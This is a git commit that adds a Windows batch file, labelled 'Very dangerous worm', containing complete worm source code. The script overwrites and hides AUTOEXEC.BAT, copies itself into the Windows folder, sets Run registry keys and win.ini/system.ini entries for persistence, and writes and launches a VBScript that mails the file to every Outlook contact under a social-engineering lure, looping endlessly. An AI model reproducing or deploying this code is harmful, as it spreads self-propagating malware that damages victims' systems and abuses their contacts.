726a4f0ebbce0a603615d88c34a153a0e28b926a
TheG0df2ther <63458929+TheG0df2ther@users.noreply.github.com>
2020-04-15 23:51:15 +0300

    Very dangerous worm!!!!!!

---
+++ worm.bat
@@ -0,0 +1,41 @@
+:worm
+
+set Slash=\
+if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
+attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
+del %SystemDrive%%Slash%AUTOEXEC.BAT
+copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
+attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
+)
+set a=worm
+copy %0 %windir%\%a%.bat
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul
+set b=worm
+copy %0 %windir%\%b%.bat
+echo [windows] >> %windir%\win.ini
+echo run=%windir%\%b%.bat >> %windir%\win.ini
+echo load=%windir%\%b%.bat >> %windir%\win.ini
+echo [boot] >> %windir%\system.ini
+echo shell=explorer.exe %b%.bat >> %windir%\system.ini
+echo dim x>>%SystemDrive%\mail.vbs
+echo on error resume next>>%SystemDrive%\mail.vbs
+echo Set fso ="Scripting.FileSystem.Object">>%SystemDrive%\mail.vbs
+echo Set so=CreateObject(fso)>>%SystemDrive%\mail.vbs
+echo Set ol=CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
+echo Set out=WScript.CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
+echo Set mapi = out.GetNameSpace("MAPI")>>%SystemDrive%\mail.vbs
+echo Set a = mapi.AddressLists(1)>>%SystemDrive%\mail.vbs
+echo Set ae=a.AddressEntries>>%SystemDrive%\mail.vbs
+echo For x=1 To ae.Count>>%SystemDrive%\mail.vbs
+echo Set ci=ol.CreateItem(0)>>%SystemDrive%\mail.vbs
+echo Set Mail=ci>>%SystemDrive%\mail.vbs
+echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%SystemDrive%\mail.vbs
+echo Mail.Subject="Is this you?">>%SystemDrive%\mail.vbs
+echo Mail.Body="Man that has got to be embarrassing!">>%SystemDrive%\mail.vbs
+echo Mail.Attachments.Add(%0)>>%SystemDrive%\mail.vbs
+echo Mail.send>>%SystemDrive%\mail.vbs
+echo Next>>%SystemDrive%\mail.vbs
+echo ol.Quit>>%SystemDrive%\mail.vbs
+start "" "%SystemDrive%\mail.vbs"
+goto worm
